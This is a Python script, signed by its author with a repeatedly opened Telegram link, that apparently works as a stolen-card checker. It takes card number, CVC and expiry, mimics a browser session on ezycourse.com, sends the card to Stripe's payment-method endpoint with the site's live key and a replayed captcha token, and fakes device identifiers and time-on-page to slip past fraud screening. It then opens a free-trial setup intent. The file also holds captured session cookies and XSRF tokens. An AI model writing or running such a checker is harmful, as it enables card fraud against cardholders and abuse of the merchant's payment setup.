import requests
import random
import json
import webbrowser



card_number = input("Enter your credit card number: ")
bin_prefix = card_number[:6]



def format_card_number(num: str) -> str:
    """Format card number with spaces every 4 digits."""
    parts = [num[i:i+4] for i in range(0, len(num), 4)]
    return " ".join(parts)

cvc = input("Enter your CVC: ")
mm = input("Enter your expiration month (MM): ")
yy = input("Enter your expiration year (YY): ")


headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'priority': 'u=0, i',
    'referer': 'https://ezycourse.com/',
    'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
    # 'cookie': '_gcl_au=1.1.984969927.1784905915; _fbp=fb.1.1784905915548.957180182637388509; ruccd=s%3AeyJtZXNzYWdlIjoiTlAiLCJwdXJwb3NlIjoicnVjY2QifQ.aeXzvLoJEjSPwyqj2x2QsFXk3taNThBZ76FIsO9nq4Q; XSRF-TOKEN=e%3A4cnpOglmEySih6d87XMYoZy4QXOkKQP7uGV1xXRuFqcibau4Obm1EXQX4g-kBzQz890JfnDOzE7QBg82ScUTZyImlUucEV-0BwSA2pBThhs.VWQ5d1RCVE82ajd1T1FwcQ.1cKzd2nDRcJKjtWcMRdxqsqNvT7L2_mwjfbtTrZGLC4; swuid=s%3AeyJtZXNzYWdlIjoiY21yejJ3cHNzOXB3ajZ2cXJoNWRkMGJpZyIsInB1cnBvc2UiOiJzd3VpZCJ9.s_ZACgWIAQo3N2UoltoocYEDzj17ZFUZgVJ0B3sv8P4; crisp-client%2Fsession%2Fa09eea92-f4ec-4c30-86be-838a16c1c7aa=session_6054a039-58bd-4791-969d-568ca28e49cd; crisp-client%2Fsocket%2Fa09eea92-f4ec-4c30-86be-838a16c1c7aa=1; cookieyes-consent=consentid:SkV1T28zMnZtNlZzQkNmUDFxNTlDU294eDNUWVBHMFY,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
}
webbrowser.open("t.me/diwazz")
params = {
    'plan': 'pro',
    'interval': 'month',
    'trial': 'true',
    'utm_source': 'header',
    'utm_medium': 'nav_cta',
    'utm_campaign': 'free_trial',
    'utm_content': 'mobile_try_free_14d',
}

response = requests.get('https://ezycourse.com/signup', params=params,  headers=headers)


if response.status_code == 200:
    print("Request successful!")


webbrowser.open("t.me/diwazz")
headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
}

params = {
    'bin_prefix': bin_prefix,
    'key': 'pk_live_51NMHTlLvIw0k1EPu80ivQ0HYQ9NUotEncPEpUYYytP8YkUPB4vNGYICv1rB5Emf6nD1UzKXd0wKzdXnumGJqYPDt00Huwrpsfq',
    '_stripe_version': '2025-03-31.basil',
}

response = requests.get('https://api.stripe.com/edge-internal/card-metadata', params=params, headers=headers)


if response.status_code == 200:
    print("Request successful!")



webbrowser.open("t.me/diwazz")
guid = ''.join(random.choices('0123456789abcdef', k=32))
muid = ''.join(random.choices('0123456789abcdef', k=32))
sid = ''.join(random.choices('0123456789abcdef', k=32))

headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
}


data = {
    'type': 'card',
    'card[number]': card_number,
    'card[cvc]': cvc,
    'card[exp_month]': mm,
    'card[exp_year]': yy,
    'guid': guid,
    'muid': muid,
    'sid': sid,
    'payment_user_agent': 'stripe.js/142f43c30d; stripe-js-v3/142f43c30d; card-element',
    'referrer': 'https://ezycourse.com',
    'time_on_page': str(random.randint(30000, 180000)),
    'client_attribution_metadata[client_session_id]': ''.join(random.choices('0123456789abcdef-', k=36)),
    'client_attribution_metadata[merchant_integration_source]': 'elements',
    'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
    'client_attribution_metadata[merchant_integration_version]': '2017',
    'client_attribution_metadata[wallet_config_id]': ''.join(random.choices('0123456789abcdef-', k=36)),
    'key': 'pk_live_51NMHTlLvIw0k1EPu80ivQ0HYQ9NUotEncPEpUYYytP8YkUPB4vNGYICv1rB5Emf6nD1UzKXd0wKzdXnumGJqYPDt00Huwrpsfq',
    '_stripe_version': '2025-03-31.basil',
}

# The hCaptcha token - this WILL expire! You need to generate fresh ones
# This token is usually obtained from a challenge. Without it, Stripe may reject the request.
data['radar_options[hcaptcha_token]'] = 'P1_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwZCI6MCwiZXhwIjoxNzg0OTA2MjYzLCJjZGF0YSI6IjVkek02c2VzY1FhTUZiUmQwV1lTckhLQWlNcUFLMExhd2d2b2ZoNkZNdmZxWnFOOU91ZjRQcjgxaDBVV015OEtWTkJHblYxV0RBTHlNSE5BRkp4MlpVamJYSmdJRzhGZU1VZ3MyVzNVbTJGTUZNWDIxZ1dPc0Ewd3pGMEpoSmt4VHg0cmxGb0N3bDFrZnE2eWNrdVpOUS85TTJGVmttYWRGM0lYMVVTVHNqVTBGWWdYL1h6ajdNelJyaFRLZDBUb0lKLzllZHZreGJwZjBGeU1YalNta3BoT3lENHdvVm9QNjFoaW15cnprTUs3SzZxelFEVkl6RGROY093SVBQS3B1cTUxZkd3dVpSQU0rZkZjMEhmNWVZdFI4bW10eG9aSmhFMzloZ2ZWTzNGRlJIZFdQQ1M5TVFtOGhkZ2xpVS9pZDdwekRjU01EOU0yZzlha2p0VnI4RG5uOU13NVNGVkpYdzA4YWNlY1JuRT04RmJlYmRsbFhIVXp0OXBhIiwicGFzc2tleSI6ImNCZk1WT2xzRStZU3FQNDQzcHBXaFVFcy9ZbFRtNkxiTGdoOTdzRTJ3c3c1NU5vakZBZzF0Kzg5dlViSWxEdE85OFBjQWloL2dYMDVBcHNiYzBTdE5oK1BkeVhsWkR6S25EdWM2SWx1Um5nVnZtVHhJS2tBMWdFZ0lLVENaS3hmNHgrYmhsUm5remcrYzlZaFRBQ1NQT1ZBN1NRWWMwMGlvdmo0TmwvaWs0S1MxcTh6MXdjbzluTlJUbVZoQXJrSXBOTWZmS1ZWNWFIcUJDbUtOajE2SWhPNWZvdGVrVlJYeTZRYjk3V2JPb1RseGc3WDg1ekZ3SitBSnVlbkdadHROYTE1MS91OFBRQ1RsVFBSSVMxOVYzRzBYZkwwRkE2VThBQVJBMlF1eHlaZ093TlI0MFdnYlUrbGJjdi9CUGpYWTcyNEUxQ0JTSEdwc0VkQTBrNzNuSkM0UGlncDM0Y1luNEM5MW1oTlhtd1lkbUMwYUdRU1hsWFJJL3NLNTVEb2diOVo0bWZsTzRXTjVCOUI5UWlFV28reHB0QmFZVTl5K1h6Y3U1TmUzWWlhbmVObC9VZmRNNWoxc3lCM3BlRVF3bDk4d1ZGdGV4akdMNHdMdmpXTHNXZGNoM2t2eS9FSzhsZnVFMlBZb21kUnZBQitKNmtQMU5pUkttVUdnU2tWRHVzV0phSkxnVVFxSG5oTm5MNFBoMWdPOE00WW5MSy8vUVhmYUFjZHBFeGFWSWZ3WktKNmovTGpITFhvMjBmVFJtbFZ1dWg4TkZWSDFhQ2JJL0VvbUZ1OTRpZ0dIcGJ1WHB3amd6VTI4Q1B4QnJOVXQrUDdaUGlZdFJpVVlQMFAvVnNRWGVxL3l4OVdFRC85MlpMMVlmeFNYTUNqOUJzWnlDYW1Cc0ljUmpVZS9yMkN1OWptRFp1OW5lc1k5SG9SN2p2TTNWdGR0R2tVTitMdmltZFlJTE5pUktIUWVFWkJ2SHJQY3RLYllUVTdaNWpDU3l6c3U4YlhaMjZsajJKVzhNdVRzR3VpVXREUGFNem83bVJNRzcxbVBXNGNENkFsSGl6YjlxeHBoRlZzNWx0TkVsT0pRcmxuTzN1ejdhVzFHLzgrZXBDWFBKVFVUN2k2anBMb0ZicVV3eUkrNHF2UlU1clN4eTJ5WjM3MXI0TjIxTDVIL0VMTEZnS3A5TFhWUnFsbEJCaER2SkxkWHZxQzhTbHpGeGp1V1pPY0I0eUdJYnB4ZTFUdktZVXFMYm1FN3ZuaUR6VUE2MWwvMjN5dFJtdmEvQm5MQVhPTXFoQ0Z3SGJ4MEFxRHNYcDltWGY5aVpxRERQTTJuOGZzQy93QUNBK1lrOVY3dzJxWHBUUDVobXc4WXA5cldMUTJsSHU1UkdYMkswYUtUNVllS3V5Y2djWVl1b1NMcmVrOURLazArY0RyZmhqdlVTVnlRMEt0cXkwS0h4cVJDWWl2Umo2SWIwbUlaUlpNNmdQZXNaYUhtSDRQcTExNVVYMnlpOWtic1hTZXk5Rm5MRWh1OEhTSFJiNDFVRlZYQ212V2VUTEQwc1d3bVd0dlM0aGxpK1VlZDM4NllDbEJhSmVZWGRuRno4NU1GNlNKU1JTOFlDMXFBdksvalNFMjlvZ0h0R3lzOCthMlJ0bnNpYTBKZHRaUE9zOXBJR0lGSTdCaXpVK01nZ1QzOUxrNGJZVFdyWVBrUEtOT1d1NTZ1Wjc0RjBLaW54RmxGQ2lxV0g1dVNiRmUrdzJBa2JldzZFMUhLK3hoa3IwSmVjWjRoTGdPSFd5bTJ1S2h5N3BTY1BvVEFCSnpUcWFpazhVL0k0NnlTOGtqVmxyVGhNVWpvdlpkdlZGRUc2S08zdHZHMkRSYy9NZEh4OGpISjNHSE9VcUU1WndydzY4VmkwaG0veTR6RDF5b1lpM2JlaUtlaHNBVkJ0dngxY1NWb2thc1VtdWE1Y2F6UHBSOGJHU1UxR2NaWHAzaFFUT1RrRTZMekF2bTZOYjBaZ0V1bkEyRnk5SkU1L2xWdVJwSHRsaWM1Vkp5cEZLYnVNUHdnMXdxclpqUTQrb3d1ZnZjOWs4MmNaOVIxbG1va2hyTm53cWROV3lGZGpTU05HMGcwbDJ3bi82M1pzWmpnR3JmRGtvbnVPT3FtNDFqY1NiSklyeGVHeitKRXZNMW9uMTFFdjRxc3Mya2RTenZsWmZwYzVVTkgxeTYxVjlrM1F4c3ZUaEdoNVFFcjgwaGRmVUhIR0JlUE5IZEE1bDZhN1dvSUZLN2hsTFdjcldTMk9tS25MTEcvVXR2Nm80ei9ENzc1ZElnMUhIY3V2U0p3aTlNOU1NcjJBaU4rdk9PcTFka09iU2ZLNDZ5L2VPdE42bkRSSXhrbGtIODIyZ2s0YlpEcG5JdlNNeTg5NzZZZ0tKdnMydEFLSktkb1RwQnRnY2h2SGRGS1VWekRsaU1WNlpuODdRdmI5RWhxRDZHd2ZJQzRRUmsxdjNXVHFTVkFUcHV2ZWl1QzBQRUFrQ3EwTUhQQUdKQThhM0Evd2c5S1JhUXVvaUhWUEdYWGkxYjUwdnd0SUxvN21zMGVxaWpMUE9JbnJWNUtCdmlVSlhyS1U3M09OWVMrNGdSd2FQcm9oSUM2L1lEdkx0aCtNOEU3cjZkazRrWmNRa1JxMGVGaXFxallES2xSZUVPeGpTeVMzQVI1K0dkVm9Xa1hROUJwU0x3UWFlRWdMbDh0S09Udm5qZ3VLN1I0NTBHY0M3R0d5QWVjbFc3MHV4VVE4SEFvdnNFdkRWam45MURRRUp6RVRYd0RHem1pRk1wVEUyYXNMYTBHUlNrdkhzTFBSYmJUbmMyZjcrUVRRRk92biszOVllcjFNenlUV2JnZlE9PSIsImtyIjoiMWM4Yzc3MmEiLCJzaGFyZF9pZCI6MzYyNDA2OTk2fQ.3r_SxjYIjYT4aNb-oEDE6nwHt-CHHsak60X3wYSRo5A'


response = requests.post(
        'https://api.stripe.com/v1/payment_methods',
        headers=headers,
        data=data,
        timeout=60  # 60 second timeout for Stripe
    )


id = response.json().get('id')
print(id)


headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://ezycourse.com',
    'priority': 'u=1, i',
    'referer': 'https://ezycourse.com/signup?plan=pro&interval=month&trial=true&utm_source=header&utm_medium=nav_cta&utm_campaign=free_trial&utm_content=mobile_try_free_14d',
    'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
    'x-xsrf-token': 'e:ZflHllbI4_yAXmKRr-Lw0vezD3DEd-V0lDD1kUFTQydg5HjP9vX58TS3rJLROUl38csw98fjKGYjJPtv4T3KSRP3ZXVlcr7lxwb0-JLTw6U.SmZtYk82S0JoLXdKckR3Xw.16dtZF50jEuYYCRAuccc5cH9ZBusrkVMQn-QOD6CGwY',
    # 'cookie': '_gcl_au=1.1.984969927.1784905915; _fbp=fb.1.1784905915548.957180182637388509; ruccd=s%3AeyJtZXNzYWdlIjoiTlAiLCJwdXJwb3NlIjoicnVjY2QifQ.aeXzvLoJEjSPwyqj2x2QsFXk3taNThBZ76FIsO9nq4Q; swuid=s%3AeyJtZXNzYWdlIjoiY21yejJ3cHNzOXB3ajZ2cXJoNWRkMGJpZyIsInB1cnBvc2UiOiJzd3VpZCJ9.s_ZACgWIAQo3N2UoltoocYEDzj17ZFUZgVJ0B3sv8P4; crisp-client%2Fsession%2Fa09eea92-f4ec-4c30-86be-838a16c1c7aa=session_6054a039-58bd-4791-969d-568ca28e49cd; crisp-client%2Fsocket%2Fa09eea92-f4ec-4c30-86be-838a16c1c7aa=1; cookieyes-consent=consentid:SkV1T28zMnZtNlZzQkNmUDFxNTlDU294eDNUWVBHMFY,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; XSRF-TOKEN=e%3AZflHllbI4_yAXmKRr-Lw0vezD3DEd-V0lDD1kUFTQydg5HjP9vX58TS3rJLROUl38csw98fjKGYjJPtv4T3KSRP3ZXVlcr7lxwb0-JLTw6U.SmZtYk82S0JoLXdKckR3Xw.16dtZF50jEuYYCRAuccc5cH9ZBusrkVMQn-QOD6CGwY; utm_source_cookie=s%3AeyJtZXNzYWdlIjp7InV0bV9zb3VyY2UiOiJoZWFkZXIiLCJpcCI6IjI0MDA6MWEwMDo2YjRkOjE2MDQ6NzhiZDplOTc5OjJmN2Q6YjY4ZiIsImNvdW50cnlfY29kZSI6Ik5QIiwiaXRlbV9pZCI6Njk1MTN9LCJwdXJwb3NlIjoidXRtX3NvdXJjZV9jb29raWUifQ.GcIBfwdZADj3kFCn_lfp27n4zc9vZr4vNaLhVzwVW3I; __stripe_mid=c7a04ac3-3231-449a-a4aa-3160117892d5ca7f87; __stripe_sid=1c8957bc-3a18-4c66-921a-f64fc6d10971b88b1d',
}

json_data = {
    f'stripe_payment_method_uuid': id ,
    'is_trial': True,
}

response = requests.post(
    'https://ezycourse.com/api/ezycourse/onboarding/create-setup-intent',
    headers=headers,
    json=json_data,
)

print(response.json())
if response.status_code == 200:
    print("Request successful!")    
if response.status_code == 400:
    print("Request failed!")
    print(response.json())

#done lets test this now 

#code by diwazz

webbrowser.open("t.me/diwazz")
